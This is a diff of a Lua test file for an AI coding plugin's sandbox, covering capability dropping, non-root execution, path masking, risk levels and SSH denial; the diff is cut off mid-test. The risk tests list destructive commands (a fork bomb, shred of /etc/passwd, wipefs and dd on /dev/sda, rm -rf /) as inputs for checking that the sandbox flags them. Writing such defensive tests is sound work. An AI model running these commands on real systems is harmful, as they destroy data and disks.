@@ -6,10 +6,18 @@
 local tests = require("NeoAI.tests")
 
 --- 保存/恢复全局配置
+--- 测试普遍把 /tmp（vim.fn.tempname）当作工作区使用：默认关闭「临时根不产生候选」
+--- （`ephemeral_roots = {}`），需要验证该行为的用例可显式传入 ephemeral_roots。
 local function with_config(overrides, fn)
   local config_store = require("NeoAI.kernel.config_store")
   local saved = config_store.get_all()
-  config_store.load(overrides)
+  local merged = vim.deepcopy(overrides or {})
+  merged.tools = merged.tools or {}
+  merged.tools.sandbox = merged.tools.sandbox or {}
+  if merged.tools.sandbox.ephemeral_roots == nil then
+    merged.tools.sandbox.ephemeral_roots = {}
+  end
+  config_store.load(merged)
   local ok, err = pcall(fn)
   config_store.load(saved)
   if not ok then error(err, 0) end
@@ -177,6 +185,44 @@ tests.suite("sandbox", function(_, it)
         local res = sandbox.apply(items[1].change_set_id, { auto_approve = true })
         t.true_(res.ok, tostring(res.reason))
         t.matches("X Y", fs.read_file(p) or "")
+        done = true
+      end, function(e)
+        t.true_(false, "不应失败: " .. tostring(e and e.message or e))
+        done = true
+      end)
+      t.true_(vim.wait(5000, function() return done end), "edit_file 应完成")
+      fs.delete_file(p)
+    end)
+  end)
+
+  it("待审：应用被取代的旧变更单元时重定向到最新版本（不报 NOT_APPROVED）", function(t)
+    local fs = require("NeoAI.utils.fs")
+    local sandbox = require("NeoAI.sandbox")
+    with_config({ tools = { approval = { mode = "async" }, sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
+      sandbox.reset()
+      local p = vim.fn.tempname() .. ".txt"
+      fs.write_file(p, "A\n")
+      local tools = require("NeoAI.tools")
+      local done = false
+      tools.execute("edit_file", {
+        filepath = p, mode = "write", content = "v1\n", description = "t",
+      }, {}):then_(function()
+        return tools.execute("edit_file", {
+          filepath = p, mode = "write", content = "v2\n", description = "t",
+        }, {})
+      end):then_(function()
+        local stale
+        for _, it in ipairs(sandbox.list_reviews()) do
+          if it.review_state == "SUPERSEDED" then
+            for _, f in ipairs(it.files or {}) do
+              if f.path == p then stale = it.change_set_id end
+            end
+          end
+        end
+        t.not_nil(stale, "应存在被取代的旧变更单元")
+        local res = sandbox.apply(stale, { auto_approve = true })
+        t.true_(res.ok, "旧 id 应用应重定向到最新并成功: " .. tostring(res.reason))
+        t.matches("v2", fs.read_file(p) or "", "应应用最新内容")
         done = true
       end, function(e)
         t.true_(false, "不应失败: " .. tostring(e and e.message or e))
@@ -695,7 +741,7 @@ tests.suite("sandbox", function(_, it)
     t.true_(not conceal.session_basename():find("neoai", 1, true), "会话名不应含 neoai")
   end)
 
-  it("加固：前缀丢弃全部 capability 并按类型遮蔽敏感路径", function(t)
+  it("加固：默认最小权限（cap-drop ALL + 主机全局能力收敛），可显式放宽", function(t)
     local runtime = require("NeoAI.sandbox.runtime")
     if runtime.backend() ~= "bwrap" then return end
     local fs = require("NeoAI.utils.fs")
@@ -703,15 +749,184 @@ tests.suite("sandbox", function(_, it)
     fs.ensure_dir(dir)
     local file = dir .. "/secret.sock"
     fs.write_file(file, "")
+    -- 默认：最小权限（--cap-drop ALL），并按 cap_drop 额外收敛主机全局能力；
+    -- 读取面靠遮蔽 + 只读根收敛，写入靠 overlay 暂存。
     with_config({ tools = { sandbox = { mask_paths = { dir, file } } } }, function()
       local prefix = runtime.process_prefix({ cwd = "/tmp" })
       t.not_nil(prefix, "应能构造前缀")
       local joined = table.concat(prefix, " ")
-      t.true_(joined:find("--cap-drop ALL", 1, true) ~= nil, "应丢弃全部 capability")
+      t.true_(joined:find("--cap-drop ALL", 1, true) ~= nil, "默认应丢弃全部 capability（最小权限）")
+      t.true_(joined:find("--cap-drop CAP_NET_ADMIN", 1, true) ~= nil, "应丢弃 CAP_NET_ADMIN（禁 netlink 改宿主网络）")
+      t.true_(joined:find("--cap-drop CAP_SYS_TIME", 1, true) ~= nil, "应丢弃 CAP_SYS_TIME（禁改宿主时钟）")
+      t.true_(joined:find("--cap-drop CAP_SYS_MODULE", 1, true) ~= nil, "应丢弃 CAP_SYS_MODULE")
+      t.true_(joined:find("--cap-drop CAP_SYS_RAWIO", 1, true) ~= nil, "应丢弃 CAP_SYS_RAWIO")
+      t.true_(joined:find("--cap-add", 1, true) == nil, "默认不应逐项 cap-add")
       t.true_(joined:find("--tmpfs " .. dir, 1, true) ~= nil, "目录应以空 tmpfs 遮蔽")
       t.true_(joined:find("--bind /dev/null " .. file, 1, true) ~= nil, "文件/socket 应以 /dev/null 遮蔽")
     end)
+    -- 显式放宽：cap_add = { "ALL" } → 不 --cap-drop ALL
+    with_config({ tools = { sandbox = { cap_add = { "ALL" } } } }, function()
+      local prefix = runtime.process_prefix({ cwd = "/tmp" })
+      local joined = table.concat(prefix, " ")
+      t.true_(joined:find("--cap-drop ALL", 1, true) == nil, "cap_add={ALL} 应保留完整能力")
+    end)
+    -- 显式列出被丢弃的能力时以显式为准（不重复 drop）
+    with_config({ tools = { sandbox = { cap_add = { "ALL", "CAP_NET_ADMIN" } } } }, function()
+      local prefix = runtime.process_prefix({ cwd = "/tmp" })
+      local joined = table.concat(prefix, " ")
+      t.true_(joined:find("--cap-drop CAP_NET_ADMIN", 1, true) == nil, "显式列出的能力不应被 cap_drop 覆盖")
+    end)
+    -- 档位能力：T2 嵌套 userns 内完整能力（caps 被 userns 作用域限制）
+    local privilege = require("NeoAI.sandbox.privilege")
+    local t2 = privilege.resolve(2, { tier = 2, network = true })
+    t.true_(t2.ok, "T2 应可解析")
+    with_config({ tools = { sandbox = {} } }, function()
+      local pre2 = table.concat(runtime.process_prefix({ cwd = "/tmp", privileges = t2.privileges }), " ")
+      t.true_(pre2:find("--cap-drop ALL", 1, true) == nil, "T2 应保留完整能力（userns 内作用域受限）")
+    end)
     vim.fn.delete(dir, "rf")
+  end)
+
+  it("最小权限：载荷默认以非 root 运行（root 启动用 run_as + setpriv 降权）", function(t)
+    local runtime = require("NeoAI.sandbox.runtime")
+    if runtime.backend() ~= "bwrap" then return end
+    with_config({ tools = { sandbox = { run_as = { uid = 65534, gid = 65534 } } } }, function()
+      local prefix = runtime.process_prefix({ cwd = "/tmp" })
+      t.not_nil(prefix, "应能构造前缀")
+      local joined = table.concat(prefix, " ")
+      if vim.uv.getuid() == 0 then
+        -- root 启动：bwrap 保持 root 完成挂载，载荷经 setpriv 降权（不用 bwrap --uid，
+        -- 否则 guest 会映射到宿主 root，是 root 伪装）。
+        t.true_(joined:find("setpriv", 1, true) ~= nil, "root 启动应以 setpriv 降权载荷")
+        t.true_(joined:find("--reuid 65534", 1, true) ~= nil, "应把载荷降为 uid 65534")
+        t.true_(joined:find("--uid 65534", 1, true) == nil, "root 启动不应使用 bwrap --uid")
+      else
+        t.true_(joined:find("--uid 65534", 1, true) ~= nil, "非 root 启动应指定载荷 uid 65534")
+        t.true_(joined:find("--unshare-user", 1, true) ~= nil or joined:find("--unshare-all", 1, true) ~= nil,
+          "非 root 载荷需要 user namespace 承载 --uid/--gid")
+      end
+    end)
+    -- 显式放弃降权（uid=0）：不注入 --uid / setpriv（保持以 root 运行载荷）。
+    with_config({ tools = { sandbox = { run_as = { uid = 0, gid = 0 } } } }, function()
+      local prefix = runtime.process_prefix({ cwd = "/tmp" })
+      local joined = table.concat(prefix, " ")
+      t.true_(joined:find("--uid", 1, true) == nil, "uid=0 不应注入 --uid")
+      t.true_(joined:find("setpriv", 1, true) == nil, "uid=0 不应 setpriv")
+    end)
+  end)
+
+  it("最小权限：实际执行以非 root 身份（id -u == run_as.uid）", function(t)
+    local runtime = require("NeoAI.sandbox.runtime")
+    if runtime.backend() ~= "bwrap" or vim.uv.getuid() ~= 0 then return end
+    if vim.fn.executable("setpriv") ~= 1 then return end
+    local sandbox = require("NeoAI.sandbox")
+    -- 工作区须可被非 root 载荷遍历：用 /tmp 下的临时目录（真实部署中工作区归用户所有）。
+    -- 注意不能用 vim.fn.tempname()（位于 /tmp/nvim.<user>，0700，非 root 不可遍历）。
+    local ws = "/tmp/neoai-nr-" .. tostring(os.time()) .. "-" .. tostring(vim.fn.getpid())
+    require("NeoAI.utils.fs").ensure_dir(ws)
+    pcall(vim.uv.fs_chmod, ws, 493) -- 0755
+    -- 沙箱存储根也须可被载荷遍历（默认在 /root 下，root 启动 + 专用 uid 时不可达）。
+    local store_root = ws .. "/store"
+    require("NeoAI.utils.fs").ensure_dir(store_root)
+    pcall(vim.uv.fs_chmod, store_root, 493)
+    local saved_cwd = vim.fn.getcwd()
+    vim.cmd("cd " .. vim.fn.fnameescape(ws))
+    local ok, err = pcall(function()
+      with_config({ tools = { approval = { mode = "async" }, sandbox = {
+        run_as = { uid = 65534, gid = 65534 }, mode = "dry_run", review = { enabled = true },
+        workspace_root = store_root,
+      } } }, function()
+        sandbox.reset()
+        local done, out = false, nil
+        require("NeoAI.tools").execute("run_command", { command = "id -u", description = "t" }, {})
+          :then_(function(r) out = tostring(r); done = true end,
+            function(e) out = "ERR:" .. tostring(e and e.message or e); done = true end)
+      t.true_(vim.wait(10000, function() return done end), "命令应完成")
+      t.matches("65534", out, "载荷应以 uid 65534 运行（实际: " .. tostring(out) .. "）")
+      -- 会话 shell 状态目录须可被非 root 载荷写入（cwd/env），否则命令会报
+      -- `cannot create .../cwd: Permission denied`。
+      t.true_(not tostring(out):find("Permission denied", 1, true),
+        "会话状态目录不应有权限错误（实际: " .. tostring(out) .. "）")
+    end)
+    end)
+    vim.cmd("cd " .. vim.fn.fnameescape(saved_cwd))
+    vim.fn.delete(ws, "rf")
+    if not ok then error(err, 0) end
+  end)
+
+  it("落盘：先非 root 尝试，权限不足 → NEEDS_ROOT；批准后以 root 写入", function(t)
+    local writer = require("NeoAI.sandbox.writer")
+    if vim.uv.getuid() ~= 0 then return end
+    local fs = require("NeoAI.utils.fs")
+    local dir = "/tmp/neoai-writer-" .. tostring(os.time()) .. "-" .. tostring(vim.fn.getpid())
+    fs.ensure_dir(dir)
+    pcall(vim.uv.fs_chmod, dir, 493) -- 0755（root 属主，非 root 不可写）
+    local target = dir .. "/f.txt"
+    with_config({ tools = { sandbox = { run_as = { uid = 65534, gid = 65534 } } } }, function()
+      local res = writer.apply("write", target, "hi\n", {})
+      t.eq(writer.STATE.NEEDS_ROOT, res.state, "非 root 不可写应返回 NEEDS_ROOT")
+      t.true_(vim.uv.fs_stat(target) == nil, "未批准时不应写入真实盘")
+      local res2 = writer.apply("write", target, "hi\n", { allow_root = true })
+      t.true_(res2.ok, "批准后应写入: " .. tostring(res2.err))
+      t.eq("root", res2.writer, "批准后应以 root 写入")
+      t.eq("hi\n", fs.read_file(target))
+    end)
+    vim.fn.delete(dir, "rf")
+  end)
+
+  it("权限：permission denied / read-only 触发提权建议（全档位）", function(t)
+    local privilege = require("NeoAI.sandbox.privilege")
+    local esc = privilege.detect_escalation({ code = 1, stderr = "touch: cannot touch '/x': Permission denied" })
+    t.not_nil(esc, "permission denied 应触发提权建议")
+    t.eq(privilege.TIER.PRIVILEGED, esc.tier)
+    local esc2 = privilege.detect_escalation({ code = 1, stderr = "Read-only file system" })
+    t.not_nil(esc2, "read-only 应触发提权建议")
+  end)
+
+  it("风险：危险指令（fork bomb / shred / wipefs）判为 L3 且默认待审", function(t)
+    local risk = require("NeoAI.sandbox.risk")
+    local cmds = { ":(){ :|:& };:", "shred -u /etc/passwd", "wipefs -a /dev/sda", "dd if=/dev/zero of=/dev/sda" }
+    for _, cmd in ipairs(cmds) do
+      local r = risk.classify({ command = cmd, tool = "run_command" })
+      t.eq(3, r.level, "应判 L3: " .. cmd)
+      t.eq("review", risk.action(r.level, {}), "默认应进入待审: " .. cmd)
+    end
+  end)
+
+  it("安全：禁止访问本机 SSH 服务（命令级硬拒绝 + agent 遮蔽 + 环境清除）", function(t)
+    local risk = require("NeoAI.sandbox.risk")
+    local runtime = require("NeoAI.sandbox.runtime")
+    for _, cmd in ipairs({
+      "ssh root@localhost", "scp a 127.0.0.1:/x", "sftp ::1",
+      "git clone ssh://127.0.0.1/repo", "sshpass -p x ssh localhost",
+    }) do
+      local denied = risk.ssh_local_target(cmd)
+      t.true_(denied, "应拒绝本机 SSH: " .. cmd)
+    end
+    t.false_(risk.ssh_local_target("ssh user@example.com"), "远端 ssh 不应拒绝")
+    t.false_(risk.ssh_local_target("ls -la"), "非 ssh 命令不应拒绝")
+    with_config({ tools = { sandbox = {} } }, function()
+      t.not_nil(runtime.is_masked_path("/run/sshd"), "应遮蔽 sshd 运行目录")
+      t.not_nil(runtime.is_masked_path("/run/ssh-agent.socket"), "应遮蔽 ssh-agent socket")
+      local sn = runtime.proxy_unset_snippet()
+      t.matches("SSH_AUTH_SOCK", sn or "", "应清除 SSH_AUTH_SOCK")
+    end)
+  end)
+
+  it("密钥：AI 生成的高熵内容被识别（生成私钥/随机 token 需关注）", function(t)
+    local secret = require("NeoAI.sandbox.secret")
+    secret.reset()
+    local key_line = string.rep("MIIEowIBAAKCAQEA", 4)
+    local files = {
+      { path = "/tmp/gen.key", content = "-----BEGIN RSA PRIVATE KEY-----\n" .. key_line .. "\n-----END RSA PRIVATE KEY-----\n" },
+      { path = "/tmp/tok.txt", content = "token=Zx9Qw2Lm7Pk4Rt8Yv3Bn6Hd1Sg5Jf0Ac\n" },
+      { path = "/tmp/plain.txt", content = "hello world, no secrets here\n" },
+    }
+    local hits = secret.detect_generated(files)
+    t.true_(#hits >= 2, "应识别生成的高熵/私钥内容，实际: " .. vim.inspect(hits))
+    -- 宿主密钥的加密 token（NEOKEY_*）不应被当作「AI 生成密钥」
+    local h2 = secret.detect_generated({ { path = "/x", content = "k=NEOKEY_deadbeefcafebabe\n" } })
+    t.eq(0, #h2, "NEOKEY token 不应计入生成高熵")
   end)
 
   it("加固：只读白名单可配置且跳过不存在项", function(t)
@@ -722,6 +937,7 @@ tests.suite("sandbox", function(_, it)
     local file = dir .. "/keep.conf"
     fs.write_file(file, "x")
     with_config({ tools = { sandbox = {
+      read_all = false,
       readonly_roots = { dir },
       readonly_paths = { file, dir .. "/missing.conf" },
     } } }, function()
@@ -733,9 +949,10 @@ tests.suite("sandbox", function(_, it)
     vim.fn.delete(dir, "rf")
   end)
 
-  it("加固：/usr 子树白名单收敛读取面（不整目录暴露）", function(t)
+  it("加固：读取面收敛（/usr 不整目录暴露，/var/lib 与 /usr/share 只读暴露）", function(t)
     local runtime = require("NeoAI.sandbox.runtime")
     if runtime.backend() ~= "bwrap" then return end
+    with_config({ tools = { sandbox = { read_all = false } } }, function()
     local prefix = runtime.process_prefix({ cwd = "/tmp" })
     t.not_nil(prefix, "应能构造前缀")
     local joined = table.concat(prefix, " ")
@@ -743,6 +960,8 @@ tests.suite("sandbox", function(_, it)
     t.true_(joined:find("--ro-bind /usr /usr ", 1, true) == nil, "不应整目录暴露 /usr")
     t.true_(joined:find("--ro-bind /usr/bin /usr/bin", 1, true) ~= nil, "应白名单暴露 /usr/bin")
     t.true_(joined:find("--ro-bind /usr/lib /usr/lib", 1, true) ~= nil, "应白名单暴露 /usr/lib")
+    t.true_(joined:find("--ro-bind /usr/share /usr/share", 1, true) ~= nil, "应只读暴露 /usr/share")
+    t.true_(joined:find("--ro-bind /var/lib /var/lib", 1, true) ~= nil, "应只读暴露 /var/lib")
     local cmd = {}
     for _, v in ipairs(prefix) do cmd[#cmd + 1] = v end
     for _, v in ipairs({ "/bin/sh", "-c",
@@ -750,14 +969,387 @@ tests.suite("sandbox", function(_, it)
       .. "if [ -s /etc/shadow ]; then echo LEAK_SHADOW; fi; "
       .. "if [ -s /etc/machine-id ]; then echo LEAK_MACHINEID; fi; "
       .. "if [ -n \"$(ls -A /var/log 2>/dev/null)\" ]; then echo LEAK_VARLOG; fi; "
-      .. "if [ -e /usr/share/doc ]; then echo LEAK_DOC; fi; "
       .. "if [ -e /usr/local/go_workspace ]; then echo LEAK_GOWORKSPACE; fi; "
       .. "if [ -e /usr/src ]; then echo LEAK_USRSRC; fi; "
+      .. "if [ -d /usr/share ] && [ -d /var/lib ]; then echo VISIBLE_OK; fi; "
       .. "echo READ_CONVERGED",
     }) do cmd[#cmd + 1] = v end
     local out = vim.fn.system(cmd)
     t.true_(out:find("READ_CONVERGED", 1, true) ~= nil, "命令应完成，实际: " .. tostring(out))
     t.true_(out:find("LEAK_", 1, true) == nil, "不应泄露宿主敏感路径，实际: " .. tostring(out))
+    t.true_(out:find("VISIBLE_OK", 1, true) ~= nil, "/var/lib 与 /usr/share 应可见，实际: " .. tostring(out))
+    end)
+  end)
+
+  it("加固：read_all 整机只读暴露，mask_paths 仍遮蔽、mask_dirs 不遮蔽", function(t)
+    local runtime = require("NeoAI.sandbox.runtime")
+    if runtime.backend() ~= "bwrap" then return end
+    with_config({ tools = { sandbox = { read_all = true } } }, function()
+      t.true_(runtime.read_all(), "read_all 默认开")
+      local joined = table.concat(runtime.process_prefix({ cwd = "/tmp" }), " ")
+      t.true_(joined:find("--ro-bind / /", 1, true) ~= nil, "应整机只读暴露")
+      -- 重要配置文件（mask_paths）仍遮蔽
+      t.true_(joined:find("--tmpfs /root/.ssh", 1, true) ~= nil, "mask_paths 应仍遮蔽 /root/.ssh")
+      -- mask_dirs（home/root 兄弟目录）不再挂载遮蔽
+      t.true_(joined:find("--tmpfs /root/neoai", 1, true) == nil, "mask_dirs 不应再遮蔽兄弟目录")
+    end)
+  end)
+
+  it("越界访问判定：cwd 之外的用户目录命中，cwd 子树/系统路径不命中", function(t)
+    local runtime = require("NeoAI.sandbox.runtime")
+    t.eq("/root/other/x", runtime.outside_workspace("/root/other/x", "/root/proj"), "cwd 外 home 路径应命中")
+    t.nil_(runtime.outside_workspace("/root/proj/a.lua", "/root/proj"), "cwd 子树不命中")
+    t.nil_(runtime.outside_workspace("/usr/bin/ls", "/root/proj"), "系统路径不命中")
+  end)
+
+  it("越界访问留痕：read_file 访问 cwd 外用户目录被记录（非阻塞）", function(t)
+    local sandbox = require("NeoAI.sandbox")
+    local fs = require("NeoAI.utils.fs")
+    with_config({ tools = { approval = { mode = "auto_allow" }, sandbox = { mode = "dry_run", read_all = true } } }, function()
+      sandbox.reset()
+      local target = vim.fn.expand("~") .. "/.bashrc"
+      if not fs.exists(target) then return end
+      local done = false
+      require("NeoAI.tools").execute("read_file", { filepath = target, description = "r" }, {})
+        :then_(function() done = true end, function() done = true end)
+      t.true_(vim.wait(8000, function() return done end), "应完成")
+      local traces = sandbox.list_traces()
+      t.true_(#traces >= 1, "应记录越界访问")
+      local found = false
+      for _, it in ipairs(traces) do
+        if it.tool == "read_file" and it.path:find(".bashrc", 1, true) then found = true end
+      end
+      t.true_(found, "应记录 read_file 的越界路径")
+    end)
+  end)
+
+  it("临时根（ephemeral_roots）：/tmp 写入不产生待审候选、不落真实盘、读取一致", function(t)
+    local fs = require("NeoAI.utils.fs")
+    local sandbox = require("NeoAI.sandbox")
+    with_config({ tools = { approval = { mode = "auto_allow" }, sandbox = {
+      mode = "dry_run", review = { enabled = true }, ephemeral_roots = { "/tmp" },
+    } } }, function()
+      sandbox.reset()
+      local p = vim.fn.tempname() .. "_eph.txt"
+      pcall(fs.delete_file, p)
+      local done = false
+      require("NeoAI.tools").execute("edit_file",
+        { filepath = p, description = "t", mode = "write", content = "eph\n" }, {}):then_(function()
+          t.false_(fs.exists(p), "临时根写入不应落到真实磁盘")
+          t.eq(0, #sandbox.list_reviews({ review_state = "PENDING" }), "临时根不应产生待审候选")
+          done = true
+        end, function(e) t.true_(false, tostring(e and e.message or e)); done = true end)
+      t.true_(vim.wait(8000, function() return done end), "edit_file 应完成")
+      local done2, out = false, nil
+      require("NeoAI.tools").execute("read_file", { filepath = p, description = "r" }, {})
+        :then_(function(r) out = tostring(r); done2 = true end, function() done2 = true end)
+      t.true_(vim.wait(8000, function() return done2 end), "read_file 应完成")
+      t.matches("eph", out or "", "读取应看到临时根内容（暂存一致）")
+    end)
+  end)
+
+  it("工具子进程：写入经 overlay 暂存为候选（不直接落盘）", function(t)
+    local runtime = require("NeoAI.sandbox.runtime")
+    if runtime.backend() ~= "bwrap" then return end
+    local sandbox = require("NeoAI.sandbox")
+    local exec = require("NeoAI.sandbox.exec")
+    with_config({ tools = { sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
+      sandbox.reset()
+      local dir = (vim.fn.stdpath("cache") .. "/NeoAI/tests_exec_stage"):gsub("/+$", "")
+      vim.fn.mkdir(dir, "p")
+      local real_file = dir .. "/out.txt"
+      pcall(os.remove, real_file)
+      local done, result = false, nil
+      exec.run({ "bash", "-c", "echo STAGED > " .. real_file }, {
+        name = "probe", writable_roots = { dir }, network = false, timeout_ms = 20000,
+      }):then_(function(res) result = res; done = true end, function() done = true end)
+      t.true_(vim.wait(20000, function() return done end, 20), "子进程应完成")
+      t.true_(result and result.code == 0, "命令应成功")
+      t.eq(0, vim.fn.filereadable(real_file), "真实文件不应落盘（已暂存）")
+      local staged = require("NeoAI.sandbox.candidate").read_path(real_file)
+      t.not_nil(staged, "应存在暂存副本")
+      local f = staged and io.open(staged)
+      local content = f and f:read("*a") or ""
+      if f then f:close() end
+      t.matches("STAGED", content, "暂存副本应含写入内容")
+      t.true_(sandbox.pending_count() >= 1, "应进入待审队列")
+      pcall(vim.fn.delete, dir, "rf")
+    end)
+  end)
+
+  it("工具子进程：沙箱禁用且 fail_closed 时拒绝", function(t)
+    local exec = require("NeoAI.sandbox.exec")
+    with_config({ tools = { sandbox = { enabled = false, fail_closed = true } } }, function()
+      local full, finish, err = exec.open({ "true" }, { network = true })
+      t.eq(nil, full, "应拒绝执行")
+      t.eq(nil, finish, "不应返回结束回调")
+      t.not_nil(err, "应给出拒绝原因")
+    end)
+  end)
+
+  it("工具子进程：超大文件不纳入候选（防阻塞主线程）", function(t)
+    local runtime = require("NeoAI.sandbox.runtime")
+    if runtime.backend() ~= "bwrap" then return end
+    local sandbox = require("NeoAI.sandbox")
+    local exec = require("NeoAI.sandbox.exec")
+    with_config({ tools = { sandbox = { mode = "dry_run", review = { enabled = true }, max_file_bytes = 1024 } } }, function()
+      sandbox.reset()
+      local dir = (vim.fn.stdpath("cache") .. "/NeoAI/tests_exec_big"):gsub("/+$", "")
+      vim.fn.mkdir(dir, "p")
+      local small = dir .. "/small.txt"
+      local big = dir .. "/big.bin"
+      pcall(os.remove, small)
+      pcall(os.remove, big)
+      local done = false
+      exec.run({ "bash", "-c", "echo hi > " .. small .. "; head -c 4096 /dev/zero > " .. big }, {
+        name = "big", writable_roots = { dir }, network = false, timeout_ms = 20000,
+      }):then_(function() done = true end, function() done = true end)
+      t.true_(vim.wait(20000, function() return done end, 20), "子进程应完成")
+      t.eq(0, vim.fn.filereadable(small), "小文件不应落盘（已暂存）")
+      t.eq(0, vim.fn.filereadable(big), "大文件不应落盘")
+      local cand = require("NeoAI.sandbox.candidate")
+      t.not_nil(cand.read_path(small), "小文件应进入候选/暂存")
+      t.eq(nil, cand.read_path(big), "超大文件不应进入候选")
+      pcall(vim.fn.delete, dir, "rf")
+    end)
+  end)
+
+  it("run_command：非零退出以结构化 error 返回（UI 显示失败）", function(t)
+    local registry = require("NeoAI.tools.registry")
+    local tool = registry.get("run_command")
+    t.not_nil(tool, "run_command 已注册")
+    local res = nil
+    tool.func({ command = "sh -c 'echo out; exit 2'", description = "t" },
+      function(v) res = v end, function(e) res = e end, {})
+    t.true_(vim.wait(5000, function() return res ~= nil end, 50), "命令应返回")
+    local decoded = require("NeoAI.utils.json").decode_or_nil(res)
+    t.true_(type(decoded) == "table" and decoded.error ~= nil, "非零退出应含 error 字段（UI 判失败）")
+    t.true_(tostring(decoded.error):find("退出码 2", 1, true) ~= nil, "error 应含退出码")
+    t.true_(tostring(decoded.output):find("out", 1, true) ~= nil, "output 应保留终端输出")
+    -- 退出码 0 仍为普通文本（成功）
+    local ok_res = nil
+    tool.func({ command = "echo fine", description = "t" },
+      function(v) ok_res = v end, function(e) ok_res = e end, {})
+    t.true_(vim.wait(5000, function() return ok_res ~= nil end, 50), "命令应返回")
+    t.eq(nil, require("NeoAI.utils.json").decode_or_nil(ok_res), "成功应为普通文本")
+  end)
+
+  it("沙箱内 sudo/doas 被剥离（已是 root）", function(t)
+    local runtime = require("NeoAI.sandbox.runtime")
+    if runtime.backend() ~= "bwrap" then return end
+    local sandbox = require("NeoAI.sandbox")
+    with_config({
+      tools = { approval = { mode = "async" }, sandbox = { mode = "dry_run", review = { enabled = true } } },
+    }, function()
+      sandbox.reset()
+      local done, out = false, nil
+      require("NeoAI.tools").execute("run_command", { command = "sudo sh -c 'echo SUDO_STRIPPED_OK'", description = "t" }, {})
+        :then_(function(r) out = tostring(r); done = true end, function(e) out = tostring(e); done = true end)
+      t.true_(vim.wait(12000, function() return done end), "命令应完成")
+      t.true_(out:find("SUDO_STRIPPED_OK", 1, true) ~= nil, "sudo 应被剥离并正常执行，实际: " .. tostring(out))
+      t.true_(out:find("sudo:", 1, true) == nil, "不应出现 sudo 报错")
+    end)
+  end)
+
+  it("包管理器识别：扩展名单与路径特征，改动封顶 L2", function(t)
+    local privilege = require("NeoAI.sandbox.privilege")
+    for _, cmd in ipairs({ "npx create-react-app x", "uv pip install requests",
+      "conda install numpy", "cargo install ripgrep", "npm i lodash" }) do
+      local r = privilege.classify("run_command", { command = cmd }, { effect = "process" })
+      t.true_(r.package, "应识别为包安装: " .. cmd)
+    end
+    t.eq("npm", privilege.package_path_manager("/x/node_modules/express/index.js"), "node_modules → npm")
+    t.eq("pip", privilege.package_path_manager("/usr/lib/python3/dist-packages/requests/x.py"), "dist-packages → pip")
+    t.eq("apt", privilege.package_path_manager("/var/lib/apt/lists/x"), "apt lists → apt")
+    t.eq("cargo", privilege.package_path_manager("/root/.cargo/registry/x"), "cargo registry → cargo")
+    t.eq("conda", privilege.package_path_manager("/opt/conda/pkgs/x"), "conda pkgs → conda")
+    t.eq(nil, privilege.package_path_manager("/root/project/src/main.lua"), "普通文件不误判")
+    local risk = require("NeoAI.sandbox.risk")
+    local r = risk.classify({ package = true, paths = { "/root/.cargo/registry/x" }, secret = true })
+    t.eq(2, r.level, "包管理器改动封顶 L2")
+  end)
+
+  it("包管理器识别：跳过 sudo/env/bash -c/for…do 包装器，避免漏判升 L3", function(t)
+    local privilege = require("NeoAI.sandbox.privilege")
+    local risk = require("NeoAI.sandbox.risk")
+    local wrapped = {
+      "sudo apt-get install -y curl",
+      "cd /tmp && sudo apt-get install -y curl",
+      "env sudo apt-get install -y curl",
+      "bash -c 'apt-get install -y curl'",
+      "for p in a b; do apt-get install -y $p; done",
+      "sh -c \"pip install requests\"",
+    }
+    for _, cmd in ipairs(wrapped) do
+      local req = privilege.classify("run_command", { command = cmd }, { effect = "process" })
+      t.true_(req.package, "包装器命令应识别为包安装: " .. cmd)
+      local r = risk.classify({
+        package = req.package, paths = { "/var/lib/apt/lists/x" }, secret = true,
+        privilege_tier = req.tier, network = req.network, command = cmd,
+      })
+      t.eq(2, r.level, "包装器包安装应封顶 L2，不因密钥误报升 L3: " .. cmd)
+    end
+    -- 非包管理器命令不应误判（首个真实命令不是包管理器）
+    t.false_(privilege.classify("run_command", { command = "echo npm" }, { effect = "process" }).package,
+      "echo npm 不应识别为包安装")
+    -- package_info 同样跳过包装器提取管理器与包名
+    local info = privilege.package_info("sudo apt-get install -y curl")
+    t.eq("apt-get", info and info.manager, "应提取管理器")
+    t.eq("apt-get:curl", info and info.key, "应提取包名合并键")
+  end)
+
+  it("风险分级：包安装不因工作区外/密钥误报升到 L3", function(t)
+    local risk = require("NeoAI.sandbox.risk")
+    local r = risk.classify({
+      package = true, paths = { "/var/lib/apt/lists/x" }, secret = true,
+      network = true, privilege_tier = 1,
+    })
+    t.eq(2, r.level, "包安装应封顶 L2")
+    t.eq(3, risk.dangerous_level("rm -rf /"), "破坏性命令应为 L3")
+    local r2 = risk.classify({ package = true, command = "rm -rf /", paths = { "/var/lib/apt/lists/x" } })
+    t.eq(3, r2.level, "破坏性包命令仍应 L3")
+  end)
+
+  it("资源限制：默认按宿主动态推导（CPU/内存/PID），静态值优先", function(t)
+    local cgroup = require("NeoAI.sandbox.cgroup")
+    t.true_(cgroup.limits_configured(), "默认应启用资源限制")
+    local l = cgroup.resolve_limits()
+    t.true_(l.memory_bytes > 0, "应推导内存上限")
+    t.true_(l.pids > 0, "应推导 PID 上限")
+    t.true_(l.cpu_max > 0, "应推导 CPU 配额")
+    with_config({ tools = { sandbox = { limits = { cpu_max = 12345, memory_bytes = 111, pids = 7 } } } }, function()
+      local s = cgroup.resolve_limits()
+      t.eq(12345, s.cpu_max, "静态 CPU 优先")
+      t.eq(111, s.memory_bytes, "静态内存优先")
+      t.eq(7, s.pids, "静态 PID 优先")
+    end)
+    with_config({ tools = { sandbox = { limits = { dynamic = false } } } }, function()
+      t.true_(not cgroup.limits_configured(), "dynamic=false 且无静态限制时不应启用")
+    end)
+  end)
+
+  it("包安装：提取管理器与包名（按安装命令合并）", function(t)
+    local privilege = require("NeoAI.sandbox.privilege")
+    local info = privilege.package_info("npm install express lodash")
+    t.not_nil(info, "应识别 npm 安装")
+    t.eq("npm", info.manager, "管理器")
+    t.eq("npm:express,lodash", info.key, "合并键")
+    local pip = privilege.package_info("pip3 install --user requests flask")
+    t.not_nil(pip, "应识别 pip 安装")
+    t.eq("pip3", pip.manager, "管理器")
+    t.eq("pip3:requests,flask", pip.key, "应跳过 flag 提取包名")
+    local ci = privilege.package_info("npm ci")
+    t.not_nil(ci, "应识别无包名的安装")
+    t.eq("npm:*", ci.key, "无显式包名时用通配键")
+    t.eq(nil, privilege.package_info("echo hello"), "非包安装返回 nil")
+  end)
+
+  it("包安装：仅整条命令均为包管理器时加回窄 capability", function(t)
+    local privilege = require("NeoAI.sandbox.privilege")
+    local r = privilege.resolve(1, { tier = 1, package_all = true })
